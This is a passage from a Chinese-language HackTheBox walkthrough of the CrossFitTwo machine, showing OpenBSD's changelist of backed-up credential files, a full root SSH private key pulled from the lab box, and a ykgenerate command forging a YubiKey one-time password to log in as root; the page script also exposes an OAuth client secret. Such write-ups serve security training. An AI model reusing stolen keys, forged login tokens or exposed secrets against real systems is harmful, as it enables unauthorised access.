class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">#	$OpenBSD: changelist,v 1.127 2020&#x2F;09&#x2F;13 10:03:46 ajacoutot Exp $</span><br><span class="line">#</span><br><span class="line"># List of files which the security script backs up and checks</span><br><span class="line"># for modifications.</span><br><span class="line">#</span><br><span class="line"># Files prefixed with a &#39;+&#39; will have their checksums stored,</span><br><span class="line"># not the actual files.</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;Distfile</span><br><span class="line">&#x2F;etc&#x2F;acme-client.conf</span><br><span class="line">&#x2F;etc&#x2F;adduser.conf</span><br><span class="line">&#x2F;etc&#x2F;adduser.message</span><br><span class="line">&#x2F;etc&#x2F;bgpd.conf</span><br><span class="line">&#x2F;etc&#x2F;boot.conf</span><br><span class="line">&#x2F;etc&#x2F;bootparams</span><br><span class="line">&#x2F;etc&#x2F;changelist</span><br><span class="line">&#x2F;etc&#x2F;chio.conf</span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;csh.cshrc</span><br><span class="line">&#x2F;etc&#x2F;csh.login</span><br><span class="line">&#x2F;etc&#x2F;csh.logout</span><br><span class="line">&#x2F;etc&#x2F;daily</span><br><span class="line">&#x2F;etc&#x2F;daily.local</span><br><span class="line">&#x2F;etc&#x2F;defaultdomain</span><br><span class="line">&#x2F;etc&#x2F;dhclient.conf</span><br><span class="line">&#x2F;etc&#x2F;dhcpd.conf</span><br><span class="line">&#x2F;etc&#x2F;disktab</span><br><span class="line">&#x2F;etc&#x2F;distfile</span><br><span class="line">&#x2F;etc&#x2F;doas.conf</span><br><span class="line">&#x2F;etc&#x2F;dvmrpd.conf</span><br><span class="line">&#x2F;etc&#x2F;eigrpd.conf</span><br><span class="line">&#x2F;etc&#x2F;ethers</span><br><span class="line">&#x2F;etc&#x2F;exports</span><br><span class="line">&#x2F;etc&#x2F;fbtab</span><br><span class="line">&#x2F;etc&#x2F;fstab</span><br><span class="line">&#x2F;etc&#x2F;ftpchroot</span><br><span class="line">&#x2F;etc&#x2F;ftpusers</span><br><span class="line">&#x2F;etc&#x2F;ftpwelcome</span><br><span class="line">&#x2F;etc&#x2F;gettytab</span><br><span class="line">&#x2F;etc&#x2F;group</span><br><span class="line">&#x2F;etc&#x2F;hostapd.conf</span><br><span class="line">+&#x2F;etc&#x2F;hostname.*</span><br><span class="line">&#x2F;etc&#x2F;hosts</span><br><span class="line">&#x2F;etc&#x2F;hosts.lpd</span><br><span class="line">&#x2F;etc&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;ifstated.conf</span><br><span class="line">+&#x2F;etc&#x2F;iked.conf</span><br><span class="line">&#x2F;etc&#x2F;iked&#x2F;local.pub</span><br><span class="line">+&#x2F;etc&#x2F;iked&#x2F;private&#x2F;local.key</span><br><span class="line">&#x2F;etc&#x2F;inetd.conf</span><br><span class="line">&#x2F;etc&#x2F;installurl</span><br><span class="line">+&#x2F;etc&#x2F;ipsec.conf</span><br><span class="line">+&#x2F;etc&#x2F;isakmpd&#x2F;isakmpd.conf</span><br><span class="line">+&#x2F;etc&#x2F;isakmpd&#x2F;isakmpd.policy</span><br><span class="line">&#x2F;etc&#x2F;isakmpd&#x2F;local.pub</span><br><span class="line">+&#x2F;etc&#x2F;isakmpd&#x2F;private&#x2F;local.key</span><br><span class="line">&#x2F;etc&#x2F;ksh.kshrc</span><br><span class="line">&#x2F;etc&#x2F;ldapd.conf</span><br><span class="line">&#x2F;etc&#x2F;ldpd.conf</span><br><span class="line">&#x2F;etc&#x2F;locate.rc</span><br><span class="line">+&#x2F;etc&#x2F;login.conf</span><br><span class="line">&#x2F;etc&#x2F;login_ldap.conf</span><br><span class="line">&#x2F;etc&#x2F;mail.rc</span><br><span class="line">&#x2F;etc&#x2F;mail&#x2F;aliases</span><br><span class="line">&#x2F;etc&#x2F;mail&#x2F;smtpd.conf</span><br><span class="line">&#x2F;etc&#x2F;mail&#x2F;spamd.conf</span><br><span class="line">&#x2F;etc&#x2F;mailer.conf</span><br><span class="line">&#x2F;etc&#x2F;man.conf</span><br><span class="line">&#x2F;etc&#x2F;master.passwd</span><br><span class="line">&#x2F;etc&#x2F;mk.conf</span><br><span class="line">+&#x2F;etc&#x2F;moduli</span><br><span class="line">&#x2F;etc&#x2F;monthly</span><br><span class="line">&#x2F;etc&#x2F;monthly.local</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;etc&#x2F;mrouted.conf</span><br><span class="line">&#x2F;etc&#x2F;mtree&#x2F;4.4BSD.dist</span><br><span class="line">&#x2F;etc&#x2F;mtree&#x2F;BSD.x11.dist</span><br><span class="line">&#x2F;etc&#x2F;mygate</span><br><span class="line">&#x2F;etc&#x2F;myname</span><br><span class="line">&#x2F;etc&#x2F;netgroup</span><br><span class="line">&#x2F;etc&#x2F;netstart</span><br><span class="line">&#x2F;etc&#x2F;newsyslog.conf</span><br><span class="line">&#x2F;etc&#x2F;npppd&#x2F;npppd.conf</span><br><span class="line">+&#x2F;etc&#x2F;npppd&#x2F;npppd-users</span><br><span class="line">&#x2F;etc&#x2F;ntpd.conf</span><br><span class="line">&#x2F;etc&#x2F;ospf6d.conf</span><br><span class="line">&#x2F;etc&#x2F;ospfd.conf</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;pf.conf</span><br><span class="line">&#x2F;etc&#x2F;pf.os</span><br><span class="line">&#x2F;etc&#x2F;printcap</span><br><span class="line">&#x2F;etc&#x2F;profile</span><br><span class="line">&#x2F;etc&#x2F;protocols</span><br><span class="line">+&#x2F;etc&#x2F;pwd.db</span><br><span class="line">&#x2F;etc&#x2F;rad.conf</span><br><span class="line">+&#x2F;etc&#x2F;radiusd.conf</span><br><span class="line">&#x2F;etc&#x2F;rbootd.conf</span><br><span class="line">&#x2F;etc&#x2F;rc</span><br><span class="line">&#x2F;etc&#x2F;rc.conf</span><br><span class="line">&#x2F;etc&#x2F;rc.conf.local</span><br><span class="line">&#x2F;etc&#x2F;rc.d&#x2F;rc.subr</span><br><span class="line">&#x2F;etc&#x2F;rc.local</span><br><span class="line">&#x2F;etc&#x2F;rc.securelevel</span><br><span class="line">&#x2F;etc&#x2F;rc.shutdown</span><br><span class="line">&#x2F;etc&#x2F;relayd.conf</span><br><span class="line">&#x2F;etc&#x2F;remote</span><br><span class="line">&#x2F;etc&#x2F;resolv.conf</span><br><span class="line">&#x2F;etc&#x2F;resolv.conf.tail</span><br><span class="line">&#x2F;etc&#x2F;ripd.conf</span><br><span class="line">&#x2F;etc&#x2F;rpc</span><br><span class="line">&#x2F;etc&#x2F;rpki&#x2F;afrinic.tal</span><br><span class="line">&#x2F;etc&#x2F;rpki&#x2F;apnic.tal</span><br><span class="line">&#x2F;etc&#x2F;rpki&#x2F;arin.tal</span><br><span class="line">&#x2F;etc&#x2F;rpki&#x2F;lacnic.tal</span><br><span class="line">&#x2F;etc&#x2F;rpki&#x2F;ripe.tal</span><br><span class="line">&#x2F;etc&#x2F;sasyncd.conf</span><br><span class="line">&#x2F;etc&#x2F;sensorsd.conf</span><br><span class="line">&#x2F;etc&#x2F;services</span><br><span class="line">&#x2F;etc&#x2F;shells</span><br><span class="line">+&#x2F;etc&#x2F;snmpd.conf</span><br><span class="line">+&#x2F;etc&#x2F;soii.key</span><br><span class="line">+&#x2F;etc&#x2F;spwd.db</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ecdsa_key.pub</span><br><span class="line">+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_ed25519_key.pub</span><br><span class="line">+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">+&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssl&#x2F;cert.pem</span><br><span class="line">&#x2F;etc&#x2F;suid_profile</span><br><span class="line">&#x2F;etc&#x2F;sysctl.conf</span><br><span class="line">&#x2F;etc&#x2F;syslog.conf</span><br><span class="line">&#x2F;etc&#x2F;switchd.conf</span><br><span class="line">&#x2F;etc&#x2F;sysmerge.ignore</span><br><span class="line">&#x2F;etc&#x2F;ttys</span><br><span class="line">&#x2F;etc&#x2F;unwind.conf</span><br><span class="line">&#x2F;etc&#x2F;usermgmt.conf</span><br><span class="line">&#x2F;etc&#x2F;vm.conf</span><br><span class="line">&#x2F;etc&#x2F;weekly</span><br><span class="line">&#x2F;etc&#x2F;weekly.local</span><br><span class="line">&#x2F;etc&#x2F;wsconsctl.conf</span><br><span class="line">&#x2F;etc&#x2F;ypldap.conf</span><br><span class="line">&#x2F;root&#x2F;.Xdefaults</span><br><span class="line">&#x2F;root&#x2F;.cshrc</span><br><span class="line">&#x2F;root&#x2F;.login</span><br><span class="line">&#x2F;root&#x2F;.profile</span><br><span class="line">&#x2F;root&#x2F;.rhosts</span><br><span class="line">&#x2F;root&#x2F;.shosts</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys2</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;var&#x2F;cron&#x2F;at.allow</span><br><span class="line">&#x2F;var&#x2F;cron&#x2F;at.deny</span><br><span class="line">&#x2F;var&#x2F;cron&#x2F;cron.allow</span><br><span class="line">&#x2F;var&#x2F;cron&#x2F;cron.deny</span><br><span class="line">&#x2F;var&#x2F;cron&#x2F;tabs&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;db&#x2F;unwind.key</span><br><span class="line">+&#x2F;var&#x2F;nsd&#x2F;etc&#x2F;nsd.conf</span><br><span class="line">&#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.conf</span><br><span class="line">&#x2F;var&#x2F;yp&#x2F;Makefile.main</span><br><span class="line">&#x2F;var&#x2F;yp&#x2F;Makefile.yp</span><br><span class="line">&#x2F;.cshrc</span><br><span class="line">&#x2F;.profile</span><br></pre></td></tr></table></figure>

<h2 id="root-id-rsa"><a href="#root-id-rsa" class="headerlink" title="root id_rsa"></a>root id_rsa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEA8kTcUuEP05YI+m24YdS3WLOuYAhGt9SywnPrBTcmT3t0iZFccrHc</span><br><span class="line">2KmIttQRLyKOdaYiemBQmno92butoK2wkL3CAHUuPEyHVAaNsGe3UdxBCFSRZNHNLyYCMh</span><br><span class="line">3AWj3gYLuLniZ2l6bZOSbnifkEHjCcgy9JSGutiX+umfD11wWQyDJy2QtCHywQrKM8m1&#x2F;0</span><br><span class="line">5+4xCqtCgveN&#x2F;FrcdrTzodAHTNoCNTgzzkKrKhcah&#x2F;nLBWp1cv30z6kPKBKx&#x2F;sZ5tHX0u1</span><br><span class="line">69Op6JqWelCu+qZViBy&#x2F;99BDVoaRFBkolcgavhAIkV9MnUrMXRsHAucpo+nA5K4j7vwWLG</span><br><span class="line">TzLOzrBGA3ZDP7w2GD7KtH070CctcjXfx7fcmhPmQDBEg4chXRBDPWzGyvKr7TIEMNVtjI</span><br><span class="line">Ug4kYNJEfSef2aWslSfi7syVUHkfvUjYnW6f2hHprHUvMtVBHPvWQxcRnxvyHuzaXetSNH</span><br><span class="line">ROva0OpGPaqpk9IOseue7Qa1+&#x2F;PKxD4j87eCdzIpAAAFkDo2gjg6NoI4AAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAPJE3FLhD9OWCPptuGHUt1izrmAIRrfUssJz6wU3Jk97dImRXHKx3NipiLbUES8i</span><br><span class="line">jnWmInpgUJp6Pdm7raCtsJC9wgB1LjxMh1QGjbBnt1HcQQhUkWTRzS8mAjIdwFo94GC7i5</span><br><span class="line">4mdpem2Tkm54n5BB4wnIMvSUhrrYl&#x2F;rpnw9dcFkMgyctkLQh8sEKyjPJtf9OfuMQqrQoL3</span><br><span class="line">jfxa3Ha086HQB0zaAjU4M85CqyoXGof5ywVqdXL99M+pDygSsf7GebR19LtevTqeialnpQ</span><br><span class="line">rvqmVYgcv&#x2F;fQQ1aGkRQZKJXIGr4QCJFfTJ1KzF0bBwLnKaPpwOSuI+78Fixk8yzs6wRgN2</span><br><span class="line">Qz+8Nhg+yrR9O9AnLXI138e33JoT5kAwRIOHIV0QQz1sxsryq+0yBDDVbYyFIOJGDSRH0n</span><br><span class="line">n9mlrJUn4u7MlVB5H71I2J1un9oR6ax1LzLVQRz71kMXEZ8b8h7s2l3rUjR0Tr2tDqRj2q</span><br><span class="line">qZPSDrHrnu0GtfvzysQ+I&#x2F;O3gncyKQAAAAMBAAEAAAGBAJ9RvXobW2cPcZQOd4SOeIwyjW</span><br><span class="line">fFyYu2ql&#x2F;KDzH81IrMaxTUrPEYGl25D5j72NkgZoLj4CSOFjOgU&#x2F;BNxZ622jg1MdFPPjqV</span><br><span class="line">MSGGtcLeUeXZbELoKj0c40wwOJ1wh0BRFK9IZkZ4kOCl7o&#x2F;xD67iPV0FJsf2XsDrXtHfT5</span><br><span class="line">kYpvLiTBX7Zx9okfEh7004g&#x2F;DBp7KmJ0YW3cR2u77KmdTOprEwtrxJWc5ZyWfI2&#x2F;rv+piV</span><br><span class="line">InfLTLV0YHv3d2oo8TjUl4kSe2FSzhzFPvNh6RVWvvtZ96lEK3OvMpiC+QKRA2azc8QMqY</span><br><span class="line">HyLF7Y65y6a9YwH+Z6GOtB+PjezsbjO&#x2F;k+GbkvjClXT6FWYzIuV+DuT153D&#x2F;HXxJKjxybh</span><br><span class="line">iJHdkEyyQPvNH8wEyXXSsVPl&#x2F;qZ+4OJ0mrrUif81SwxiHWP0CR7YCje9CzmsHzizadhvOZ</span><br><span class="line">gtXsUUlooZSGboFRSdxElER3ztydWt2sLPDZVuFUAp6ZeMtmgo3q7HCpUsHNGtuWSO6QAA</span><br><span class="line">AMEA6INodzwbSJ+6kitWyKhOVpX8XDbTd2PQjOnq6BS&#x2F;vFI+fFhAbMH&#x2F;6MVZdMrB6d7cRH</span><br><span class="line">BwaBNcoH0pdem0K&#x2F;Ti+f6fU5uu5OGOb+dcE2dCdJwMe5U&#x2F;nt74guVOgHTGvKmVQpGhneZm</span><br><span class="line">y2ppHWty+6QimFeeSoV6y58Je31QUU1d4Y1m+Uh&#x2F;Q5ERC9Zs1jsMmuqcNnva2&#x2F;jJ487vhm</span><br><span class="line">chwoJ9VPaSxM5y7PJaA9NwwhML+1DwxJT799fTcfOpXYRAAKiiAAAAwQD5vSp5ztEPVvt1</span><br><span class="line">cvxqg7LX7uLOX&#x2F;1NL3aGEmZGevoOp3D1ZXbMorDljV2e73UxDJbhCdv7pbYSMwcwL4Rnhp</span><br><span class="line">aTdLtEoTLMFJN&#x2F;rHhyBdQ2j54uztoTVguYb1tC&#x2F;uQZvptX&#x2F;1DJRtqLVYe6hT6vIJuk&#x2F;fi8</span><br><span class="line">tktL&#x2F;yvaCuG0vLdOO52RjK5Ysqu64G2w+bXnD5t1LrWJRBK2PmJf+406c6USo4rIdrwvSW</span><br><span class="line">jYrMCCMoAzo75PnKiz5fw0ltXCGy5Y6PMAAADBAPhXwJlRY9yRLUhxg4GkVdGfEA5pDI1S</span><br><span class="line">JxxCXG8yYYAmxI9iODO2xBFR1of1BkgfhyoF6&#x2F;no8zIj1UdqlM3RDjUuWJYwWvSZGXewr+</span><br><span class="line">OTehyqAgK88eFS44OHFUJBBLB33Q71hhvf8CjTMHN3T+x1jEzMvEtw8s0bCXRSj378fxhq</span><br><span class="line">&#x2F;K8k9yVXUuG8ivLI3ZTDD46thrjxnn9D47DqDLXxCR837fsifgjv5kQTGaHl0+MRa5GlRK</span><br><span class="line">fg&#x2F;OEuYUYu9LJ&#x2F;cwAAABJyb290QGNyb3NzZml0Mi5odGIBAgMEBQYH</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>生成Yubikey密码，使用公钥及密码登录，得到root.txt:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  yubico-c git:(master) ✗ ./ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 0f08  c0a8 00 02</span><br><span class="line">cttndvdheldlhjfubluidkckfvgjvbeb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051207.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2021/master/2021051208.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li><a href="https://amphp.org/websocket-client/" target="_blank" rel="noopener">https://amphp.org/websocket-client/</a></li>
<li><a href="https://man.openbsd.org/unbound.conf" target="_blank" rel="noopener">https://man.openbsd.org/unbound.conf</a></li>
<li><a href="https://github.com/iphelix/dnschef" target="_blank" rel="noopener">https://github.com/iphelix/dnschef</a></li>
<li><a href="https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders" target="_blank" rel="noopener">https://nodejs.org/api/modules.html#modules_loading_from_node_modules_folders</a></li>
<li><a href="https://man.openbsd.org/man8/login_yubikey.8" target="_blank" rel="noopener">https://man.openbsd.org/man8/login_yubikey.8</a></li>
<li><a href="https://github.com/Yubico/yubico-c" target="_blank" rel="noopener">https://github.com/Yubico/yubico-c</a></li>
<li><a href="https://man.openbsd.org/changelist" target="_blank" rel="noopener">https://man.openbsd.org/changelist</a></li>
<li><a href="https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current" target="_blank" rel="noopener">https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current</a></li>
<li>Crossfittwo | RaidForums<br><a href="https://raidforums.com/Thread-Free-Flag-Crossfittwo" target="_blank" rel="noopener">https://raidforums.com/Thread-Free-Flag-Crossfittwo</a></li>
<li>CrossFitTwo: Hack The Box Walkthrough<br><a href="https://hackso.me/crossfit2-htb-walkthrough/" target="_blank" rel="noopener">https://hackso.me/crossfit2-htb-walkthrough/</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2021-08-16T05:27:20.685Z" itemprop="dateUpdated">2021-08-16 13:27:20</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/&title=《CrossFitTwo - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/&title=《CrossFitTwo - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CrossFitTwo - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/05/13/pivotapi-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">pivotapi - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/05/10/Proper-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Proper - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/&title=《CrossFitTwo - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/&title=《CrossFitTwo - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《CrossFitTwo - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2021/05/12/CrossFitTwo-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
